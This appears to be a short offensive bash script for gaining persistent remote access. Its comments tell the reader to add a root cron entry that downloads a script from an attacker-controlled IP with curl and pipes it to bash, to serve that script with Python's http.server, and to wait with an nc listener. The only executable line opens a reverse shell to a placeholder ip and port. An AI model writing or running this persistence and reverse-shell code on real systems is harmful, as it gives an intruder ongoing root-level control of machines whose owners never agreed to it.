#!/bin/bash

#BEWARE very noising and not very hidden!
#add and edit the line below to cronjobs
#* *     * * *   root    curl http://<yourip>:8080/shell | bash

#run python3 -m http.server 8080
#setup nc -lvnp port 
bash -i >& /dev/tcp/ip/port 0>&1
